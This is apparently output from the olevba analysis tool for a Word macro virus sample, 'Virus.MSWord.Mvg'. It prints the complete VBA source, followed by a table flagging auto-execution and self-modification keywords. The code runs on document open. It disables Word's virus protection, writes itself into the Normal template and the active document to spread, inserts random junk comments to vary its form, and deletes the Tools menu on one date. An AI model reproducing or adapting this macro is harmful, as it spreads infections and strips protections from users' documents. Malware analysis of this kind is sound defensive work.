olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mvg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mvg - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Const jedan = 1: nula = 2 * 0: verzija = (10 - 1)
With Options
.VirusProtection = nula
End With
If Application.Version = verzija & "." & nula Then
GoTo pocni
aha:
GoTo startaj
startaj:
GoTo aha
pocni:
Set vx = ThisDocument.VBProject: Set ma = vx.VBComponents(jedan):
ve = ma.CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(jedan).CodeModule.CountOfLines)
If nt <> ve Then
Set infnt = NormalTemplate.VBProject.VBComponents(jedan).CodeModule
infnt.DeleteLines 1, infnt.CountOfLines
infnt.AddFromString ve
End If
Set we = NormalTemplate.VBProject: Set ku = we.VBComponents(jedan):
nt = ku.CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If ad <> ve Then
Set INFAD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
INFAD.DeleteLines 1, INFAD.CountOfLines
INFAD.AddFromString ve
Set vo = ActiveDocument.VBProject: Set gr = vo.VBComponents(jedan):
ad = gr.CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(jedan).CodeModule.CountOfLines)
End If
End If
Dim KSJDHFE, PODFGHN, ZXCASDF, PIOUWER, A, B, QWPEOIS
adf = ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
For ah = 1 To adf
dg = Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(ah, 1), 1, 1)
If dg = "'" Then ThisDocument.VBProject.VBComponents(1).CodeModule.DeleteLines ah, 1
Next ah
For KSJDHFE = 10 To 1 Step -2
For PODFGHN = 0 To 2
ZXCASDF = Chr(Rnd * 105 + 1) & Asc(Chr(Rnd * 10 + 1))
QWPEOIS = Hex(Rnd * 120 + 4)
PIOUWER = ZXCASDF & PIOUWER & QWPEOIS
Next PODFGHN
Next KSJDHFE
Set AdAcTiV = ActiveDocument.VBProject.VBComponents(1).CodeModule
For c = 1 To AdAcTiV.CountOfLines + 38 Step 2
AdAcTiV.insertlines c + 1, "'" & PIOUWER
Next c
If Second(Now()) = 8 And Minute(Now()) = 6 And Hour(Now()) = 3 And Day(Now()) = 2 Then
CommandBars("Tools").Delete ""
'WordMacro.MVG by e[ax]
'RCJ v1.0 (Random Comment Junker) by e[ax]
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

